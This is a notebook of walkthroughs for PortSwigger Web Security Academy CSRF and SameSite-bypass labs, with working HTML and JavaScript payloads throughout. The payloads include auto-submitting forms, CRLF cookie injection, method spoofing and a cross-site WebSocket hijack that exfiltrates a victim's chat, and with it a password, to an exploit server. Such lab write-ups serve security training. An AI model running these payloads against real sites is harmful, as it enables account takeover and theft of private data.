# %% [markdown]
# # **CSRF vulnerability with no defenses Lab :**
#
#  * Login Using The Provided Credentials then go to ```My account``` Page and Try The **Update email** Functionality
#
#  * Intercept The Changing Email Request and Look For any Protections against CSRF Attacks Then send it The repeater
#
#  * You Will Find (referrer Header - Origin Header - Custom Headers), If You Remove all of Them the Request maintain to be valid and will be sent successfully
#
#  * Craft Your Malicious HTML Page and Deliver it to The Victim
#
#      ```html
#      <html>
#         <body>
#             <form action="https://0a84000a0344a57881f28edf001500ed.web-security-academy.net/my-account/change-email" method="POST" id="send">
#                 <input type="hidden" name="email" value="attacker@gmail.com">
#             </form>
#             <script>
#                 document.forms["send"].submit();
#             </script>
#         </body>
#      </html>
#      ```
#
#
# ***
# ***
# ***
#
# # **CSRF where token validation depends on request method Lab :**
#
#
#  * Login Using The Provided Credentials then go to ```My account``` Page and Try The **Update email** Functionality
#
#  * Intercept The Changing Email Request and Look For any Protections against CSRF Attacks Then send it The repeater
#
#  * You Will Find (referrer Header - Origin Header - Custom Headers), If You Remove all of Them the Request maintain to be valid and will be sent successfully
#
#  * There is a ```csrf token``` :
#
#      * Try to Remove it or Change its value :
#
#          * in both cases the Request will not be valid ,
#
#
#  * Try to Change the Request Method and then change the csrf token value :
#
#      * The Request is Sent Successfully
#
#
#  * Craft Your Malicious HTML Page and Deliver it to The Victim
#
#      ```htm
#      <html>
#          <body>
#              <form action="https://0a6d00f604b6344a803a0d95004f0093.web-security-academy.net/my-account/change-email" method="GET"  id="send">
#                  <input type="hidden" name="email" value="attacker@gmail.com">
#              </form>
#              <script>
#                  document.forms['send'].submit();
#              </script>
#          </body>
#      </html>
#      ```
#
#
# ***
# ***
# ***
#
# # **CSRF where token validation depends on token being present Lab :**
#
#
#  * Login Using The Provided Credentials then go to ```My account``` Page and Try The **Update email** Functionality
#
#  * Intercept The Changing Email Request and Look For any Protections against CSRF Attacks Then send it The Repeater
#
#  * You Will Find (referrer Header - Origin Header - Custom Headers), If You Remove all of Them the Request maintain to be valid and will be sent successfully
#
#  * There is a ```csrf token``` :
#
#      * Try to Remove it or Change its value :
#
#          * In Case of Changing its Value the Request will not be sent
#
#          * But if We entirely removed it the Request will be sent Successfully
#
#  *  Craft Your Malicious HTML Page and Deliver it to The Victim
#
#      ```htm
#      <html>
#         <body>
#             <form action="https://0ada0028032c479482f547a400bf00d4.web-security-academy.net/my-account/change-email" method="POST" id="send">
#                 <input type="hidden" name="email" value="attacker@gmail.com">
#             </form>
#             <script>
#                 document.forms["send"].submit();
#             </script>
#         </body>
#      </html>
#      ```
#
#
# ***
# ***
# ***
#
# # **CSRF where token is not tied to user session Lab :**
#
#
#  * Login Using One of the Two Provided Credentials then go to ```My account``` Page and Try The **Update email** Functionality
#
#  * Intercept The Changing Email Request and Look For any Protections against CSRF Attacks Then send it The Repeater
#
#  * If You try to Send the Request for the first time it will be sent successfully , But if you tried To Send it Again With Same Tokens the Request will be rejected !!!!
#
#  * If You Open the Source (CTRL+u) and Refreshed the Page Multiple times You Will Notice that the CSRF Token Is Changing Every Time **(The Token Is Valid For Only One Request => not tied to user session)**
#
#      * Imagine That You Have a Container of CSRF Tokens , Every time you send a Request The Server Search Inside this Container and see if it has been used before or not , If it has been used before your Request Will  be Rejected
#
#
#  * Now What if We Have another Account its CSRF Token Has not been Used Before (never been sent in any Request) and We Tried to Use it to send a Request for the First Account
#
#      * That Would Work Because the CSRF Token is not tied to user session
#
#  * Now Login to The Second Account and Open Page Source and Take the Un-used CSRF Token and add to Your Payload
#
#      ```htm
#      <html>
#         <body>
#             <form action="https://0aa900ce0450910483287dcc008b006c.web-security-academy.net/my-account/change-email" method="POST" id="send">
#                 <input type="hidden" name="email" value="attacker@gmail.com">
#                 <!-- The Value Of csrf can be Used Only once -->
#                 <input type="hidden" name="csrf" value="GLJ1ZGqEvgemUVBsCt53arJXF6Fo5sgy">
#             </form>
#             <script>
#                 document.forms['send'].submit();
#             </script>
#         </body>
#      </html>
#      ```
#
#
# ***
# ***
# ***
#
# # **CSRF where token is tied to non-session cookie Lab :**
#
#  * Login to the Provided Two Accounts
#
#  * Intercept The Changing Email Request and Look For any Protections against CSRF Attacks Then send it The Repeater
#
#  * You Will Find (referrer Header - Origin Header - Custom Headers), If You Remove all of Them the Request maintain to be valid and will be sent successfully
#
#  * There is a ```csrf token``` :
#
#      * Try to Remove it or Change its value :
#
#          * in both cases the Request will not be valid
#
#      * This Token Does not Change
#
#  * We Have Two Cookies :
#
#      1) session :
#
#          * If We Removed this This Cookie from the Request it will Be sent Successfully
#
#      2) csrfKey :
#
#          * This Cookie has a related csrf Token
#
#          * if We swap the csrfKey cookie and csrf Token from the One account to the another account the request Will Be sent Successfully
#
#
#  * Now Back to Home Page and Use Search (has no CSRF Protection), So We Can Inject Our csrfKey Cookie to The Victim's Browser
#
#
#  * **The Delivered Payload :**
#
#      ```htm
#      <html>
#          <body>
#              <form method="POST" action="https://0a97006c03a3517e8050711f006600d6.web-security-academy.net/my-account/change-email">
#                  <input type="hidden" name="email" value="Attacker@hack.com" />
#                  <input type="hidden" name="csrf" value="ymPl9177JSBlEuciCErcNyqJF5hjPCYr" />
#              </form>
#              <!-- Setting Attacker's csrfKey to The Victim's csrfKey -->
#              <img src="https://0a97006c03a3517e8050711f006600d6.web-security-academy.net/?search=%0d%0aSet-Cookie:csrfKey=qaAuXswFboUW4c8xlVRvQ9PM7DA0xNW9%3b%20SameSite=None" onerror="document.forms[0].submit()" />
#          </body>
#      </html>
#      ```
#
#
#
# ***
# ***
# ***
#
# # **CSRF where token is duplicated in cookie Lab :**
#
#
#  * Login to the Provided Two Accounts
#
#  * Intercept The Changing Email Request and Look For any Protections against CSRF Attacks Then send it The Repeater
#
#  * You Will Find (referrer Header - Origin Header - Custom Headers), If You Remove all of Them the Request maintain to be valid and will be sent successfully
#
#  * Notice That There is a Double Submit Cookie , The server validates that both cookies are present and their values match before processing the request , So We Can Set a Fake Cookie in Victim
#
#      ```htm
#      <html>
#          <body>
#              <form method="POST" action="https://0a7d00ea03e5f762806017c300f9006f.web-security-academy.net/my-account/change-email">
#                  <input type="hidden" name="email" value="Attacker@hack.com" />
#                  <input type="hidden" name="csrf" value="fake" />
#              </form>
#
#              <img src="https://0a7d00ea03e5f762806017c300f9006f.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit()" />
#          </body>
#      </html>
#      ```
#
# ***
# ***
# ***
#
# # **SameSite Lax bypass via method override Lab :**
#
#  * The SameSite Cookie is Set to Lax (By Default) , We Can Bypass This if the site allows state-changing requests with the GET HTTP method :
#
#  * Login Using The Provided Credentials then go to ```My account``` Page and Try The **Update email** Functionality
#
#  * Intercept The Changing Email Request and Look For any Protections against CSRF Attacks Then send it The Repeater
#
#      * There is No CSRF Token
#
#
#  * Now Try To Change the Request Method from **POST** to **GET** and Send the Request :
#
#      * "Method Not Allowed"
#
#
#  * We Need To Override the Request Method to Be **GET**
#
#      * We Can Use **Method Spoofing** :
#
#          * By Adding Hidden ```_method``` field to the Form
#
#
#  * **Payload :**
#
#      ```htm
#      <html>
#          <body>
#              <form method="GET" action="https://0a94000e032cfc9d8055cca700000056.web-security-academy.net/my-account/change-email">
#                  <input type="hidden" name="email" value="Attacker@hack.com" />
#                  <!-- tries to instruct the server to interpret the form submission (which is using GET) as a POST request instead -->
#                  <input type="hidden" name="_method" value="POST" />
#              </form>
#              <script>
#                  document.forms[0].submit();
#              </script>
#          </body>
#      </html>
#      ```
#
# ***
# ***
# ***
#
# # **SameSite Strict bypass via client-side redirect Lab :**
#
#  * Intercepting Changing-Email Request :
#
#      * There is a ```submit``` Parameter That Can not be Removed or Changed
#
#      * No csrf Token => Vulnerable to CSRF Attack
#
#  * If We Change Request Method to GET the Request Will Be Sent Successfully
#
#  * Open ```login``` Request From ```HTTP History``` In Burp :
#
#      * Set-Cookie: session=t8vkr9leCzyb31Utt9rSixZaFjxTaCHk; Secure; HttpOnly; ``SameSite=Strict``
#
#          * ```SameSite``` Cookie Is Set to **Strict** (Blocks cookies from being sent with cross-site requests even when following a regular link)
#
#              * This Can Be Bypassed Using ```client-side redirect``` , Now Let's Search For it
#
#                  *  Go to **Home** Page and View any Post , Then Make a Comment
#
#                  * Notice That You Will Be Redirected Back to The Post Page Where you Have Commented
#
#                  * Go To Burp's HTTP History and Search for Redirection GET Request ``/post/comment/confirmation`` and Open its Response , You Will Find a Function Called ``redirectionOnConfirmation('/post')`` , and JS File at ``/resources/js/commentConfirmationRedirection`` Open it and See What Does it Contain :
#
#                      ```JS
#                      redirectOnConfirmation = (blogPath) => {
#                          setTimeout(() => {
#                              const url = new URL(window.location); // creates a new URL object based on the current page's location (window.location)
#
#                              const postId = url.searchParams.get("postId"); //  extracts the value of a query parameter named "postId" from the URL
#
#                              window.location = blogPath + '/' + postId; // sets the browser's location (window.location) to a new URL. This new URL is constructed by combining the provided blogPath argument, a forward slash (/), and the extracted postId
#                          }, 3000);
#                      }
#                      ```
#
#                      * Now We Will Manipulate postId to Achieve Our Goal
#
#
#                      * **Payload :**
#
#                      ```htm
#                      <script>
#                          window.location = "https://0abf005f04a8846780fe6c4600b50002.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=Attacker%40hack.com%26submit=1";
#                      </script>
#                      ```
#
#                      ``../`` indicates going up a directory level in the URL structure => ``Home``
#
# ***
# ***
# ***
#
# # **SameSite Strict bypass via sibling domain Lab :**
#
#  * Go to **Live chat** and Send Some messages , if You Refreshed the Page Your entire messages will be displayed again
#
#  * There is a **SameSite=Strict** Cookie , so cookies won't be sent with cross-site requests
#
#  * Open Burp's Proxy Then Open **WebSocket history** tab and Clear This History
#
#  * Back to Live chat and Refresh it then back to WebSocket history again :
#
#      * Notice that the First Request Message to Server is ``READY`` then The Server Responses with All Chat History
#
#  * Go to **HTTP history** Tab and Open ``/chat`` EndPoint Request Where the Handshake Happens (Connection: Upgrade) , and Server Respond with Confirming Switching Protocol to ``websocket``
#
#      * There No CSRF Token (/chat Endpoint is Vulnerable to CSRF Attack)
#
#  * Open **/chat** endpoint Request (MIME type => HTML) and See The Response From The Server You Will Find the wss Address :
#
#      * ``wss://0a8f006c031dd93880e69e3400960005.web-security-academy.net/chat``
#
#  * Open **resources/js/chat.js** Endpoint Request and Open its Response You Will Find The Following Function :
#
#      ```JS
#      var newWebSocket = new WebSocket(chatForm.getAttribute("action"));
#
#      newWebSocket.onopen = function (evt) {
#          writeMessage("system", "System:", "No chat history on record");
#          newWebSocket.send("READY");
#          res(newWebSocket);
#      }
#      newWebSocket.onmessage = function (evt) {
#          var message = evt.data;
#      };
#      ```
#
#      * Change It to Get Our Initial Payload :
#
#          ```JS
#          var newWebSocket = new WebSocket("wss://0a8f006c031dd93880e69e3400960005.web-security-academy.net/chat");
#
#          newWebSocket.onopen = function (evt) {
#              newWebSocket.send("READY");
#          }
#          newWebSocket.onmessage = function (evt) {
#              var message = evt.data;
#              fetch("https://exploit-0a7400ec0307d99a800b9dc201c7004e.exploit-server.net/exploit?message=" + btoa(message));
#          };
#          ```
#
#          * Go to Exploit Server and Send The Previous Payload to the Victim (inside script tags), Wait For Seconds and then Open **access log** :
#
#              * **Received Message From the Victim :
#
#                  * message=eyJ1c2VyIjoiQ09OTkVDVEVEIiwiY29udGVudCI6Ii0tIE5vdyBjaGF0dGluZyB3aXRoIEhhbCBQbGluZSAtLSJ9   (Base64 Encoded)
#
#                  * Decode it Using Burp Decoder => {"user":"CONNECTED","content":"-- Now chatting with Hal Pline --"}
#
#                      * Because of SameSite=Strict We Just Seeing the Chat Message of a New Chat Session
#
#
#          * Now We Need to Bypass SameSite=Strict Limitation :
#
#              * Open **resources/js/chat.js** Endpoint Request and Open its Response You Will Find The Following Header :
#
#                  * ``Access-Control-Allow-Origin: https://cms-0a8f006c031dd93880e69e3400960005.web-security-academy.net``
#
#                      * Let's Open This Link , It is a Basic Login Page Vulnerable to XSS Attacks
#
#                      * Enter any Simple Payload ``(<script>alert()</script>)`` and See Its Login POST Request and its Response :
#
#                          * The Simple Payload Just Reflected directly  inside ``<p>`` tag Without any Restrictions
#
#                      * Take The Previous Request and Send it to Repeater and Change the Request Method, Send it and See What Would Happen :
#
#                          * The Request is Sent Successfully :)
#
#                          * Now Change **username** Parameter to Our Initial Payload (URL Encoded)
#
#                      * Now Back to The Exploit Server and Enter The Final Payload :
#
#                          * We Will Use **document.location** to Redirect The Victim to The Vulnerable Login Page , and Inject Our Final Payload as username Parameter
#
#                          * **Payload :**
#
#                              ```htm
#                              <script>
#                                  document.location = "https://cms-0a8f006c031dd93880e69e3400960005.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%76%61%72%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%22%77%73%73%3a%2f%2f%30%61%38%66%30%30%36%63%30%33%31%64%64%39%33%38%38%30%65%36%39%65%33%34%30%30%39%36%30%30%30%35%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%22%29%3b%0a%0a%20%20%20%20%20%20%20%20%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%20%20%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%76%61%72%20%6d%65%73%73%61%67%65%20%3d%20%65%76%74%2e%64%61%74%61%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%66%65%74%63%68%28%22%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%37%34%30%30%65%63%30%33%30%37%64%39%39%61%38%30%30%62%39%64%63%32%30%31%63%37%30%30%34%65%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6d%65%73%73%61%67%65%3d%22%20%2b%20%62%74%6f%61%28%6d%65%73%73%61%67%65%29%29%3b%0a%20%20%20%20%20%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=123456"
#                              </script>
#                              ```
#
#                      * Now Open **access log** You Will Find Multiple Message Decode Them and See What does it Contain :
#
#                          *  {"user":"Hal Pline","content":"Hello, how can I help?"}
#                          * {"user":"CONNECTED","content":"-- Now chatting with Hal Pline --"}
#                          * {"user":"You","content":"I forgot my password"}
#                          * {"user":"You","content":"Thanks, I hope this doesn&apos;t come back to bite me!"}
#                          * {"user":"Hal Pline","content":"No problem carlos, it&apos;s bxcuma4m65ioftzo2ab3"}
#
#                              * As You See The Last Message Has Victim's Credentials , Take Them and Login
#
#                                  * **Username :** carlos
#                                  * **Password :** bxcuma4m65ioftzo2ab3
#
# ***
# ***
# ***
#
# # **SameSite Lax bypass via cookie refresh Lab :**
#
#  * Go to ``My account`` and Login With Provided Credentials
#
#  * Change-Email Functionality is Vulnerable to CSRF Attack
#
#  * Sign-in With Social Media Account
#
#  * Open Burp and intercept ``Continue`` Request  :
#
#      * You Will Find The Following Request :
#
#          ```
#          GET /oauth-callback?code=71Ejxwy65CQWHY1y8u8E904zfWKzrYvA5edQY7TBuy1 HTTP/2
#          Host: 0ac1007c03418c1b832ace01001400d9.web-security-academy.net
#          ```
#
#          * and No Specified SameSite Cookie Restrictions (browser will use the default **Lax** restriction)
#
#      * Drop The Request
#
#
#  * Now We Need to Bypass SameSite Limitation :
#
#      * Open Burp's HTTP History , There is a Request to ``/social-login`` which starts the full OAuth Flow
#
#      * No Let's Force The Victim to Visit ``/social-login`` Endpoint then make him Trigger the Change-Email Functionality
#
#          ```htm
#          <html>
#              <body>
#                  <form method="POST" action="https://0ac1007c03418c1b832ace01001400d9.web-security-academy.net/my-account/change-email">
#                      <input type="hidden" name="email" value="Attacker@hack.com" />
#                  </form>
#                  <script>
#                      window.open('https://0ac1007c03418c1b832ace01001400d9.web-security-academy.net/social-login');
#                      setTimeout(submitChange, 5000);
#                      function submitChange() {
#                          document.forms[0].submit();
#                      };
#                  </script>
#              </body>
#          </html>
#          ```
#
#          * Now Let's Try This , Go to Exploit Server then Store The Previous Payload then Click **View Exploit** :
#
#              * The Attack Failed Because there is a ``Pop-Up Blocker`` ( Triggered Because the User Have not Manually interacted with the site )
#
#          * Now We Need to Make The User Click on The Page :
#
#              ```htm
#              <html>
#                  <body>
#                      <form method="POST" action="https://0ac1007c03418c1b832ace01001400d9.web-security-academy.net/my-account/change-email">
#                          <input type="hidden" name="email" value="ATtacker@hack.com" />
#                      </form>
#                      <p>Please Click AnyWhere to Continue</p>
#                      <script>
#                          // Event listener triggers a function whenever the user clicks anywhere on the page
#                          window.onclick = () => {
#                              window.open('https://0ac1007c03418c1b832ace01001400d9.web-security-academy.net/social-login');
#                              // submitChange function after a 5-second delay
#                              setTimeout(submitChange, 5000);
#                          };
#                          function submitChange() {
#                              document.forms[0].submit();
#                          };
#                      </script>
#                  </body>
#              </html>
#              ```
#
# ***
# ***
# ***
#
# # **CSRF where Referer validation depends on header being present Lab :**
#
#  * Login Using The Provided Credentials then go to ```My account``` Page and Try The **Update email** Functionality
#
#  * Intercept The Changing Email Request and Look For any Protections against CSRF Attacks Then send it The repeater
#
#  * You Will Find (Origin Header - Custom Headers), If You Remove all of Them the Request maintain to be valid and will be sent successfully
#
#  * There is a ``Referer Header`` , Let's Try To Remove/Change is :
#
#      * If We Removed it => Request sent Successfully
#
#
#  * **Payload :**
#
#      ```htm
#      <html>
#          <head>
#              <meta name="referrer" content="never" />
#          </head>
#          <body>
#              <form method="POST" action="https://0a78004d03a7ceef83428d4800490015.web-security-academy.net/my-account/change-email">
#                  <input type="hidden" name="email" value="Attacker@hack.com" />
#              </form>
#              <script>
#                  document.forms[0].submit();
#              </script>
#          </body>
#      </html>
#      ```
#
#
# ***
# ***
# ***
# # **CSRF with broken Referer validation Lab :**
#
#  * Login Using The Provided Credentials then go to ```My account``` Page and Try The **Update email** Functionality
#
#  * Intercept The Changing Email Request and Look For any Protections against CSRF Attacks Then send it The repeater
#
#  * You Will Find (Origin Header - Custom Headers), If You Remove all of Them the Request maintain to be valid and will be sent successfully
#
#  * There is a ``Referer Header`` , Let's Try To Remove/Change is :
#
#      * If We Removed it => Request Denied => ``"Invalerer header"``
#
#      * If We Change it => Request Sent Successfully
#
#
#  * **Payload :**
#
#      * ADD ``Referrer-Policy: unsafe-url`` to ``Head`` Inside the Exploit Server
#
#      ```htm
#      <html>
#          <body>
#              <script>
#                 history.pushState('', '', '/?0a4a00dc048371cc83bab91600bd0053.web-security-academy.net/my-account')
#              </script>
#              <form method="POST" action="https://0a4a00dc048371cc83bab91600bd0053.web-security-academy.net/my-account/change-email">
#                  <input type="hidden" name="email" value="Attacker@hack.com" />
#              </form>
#              <script>
#                  document.forms[0].submit();
#              </script>
#          </body>
#      </html>
#      ```
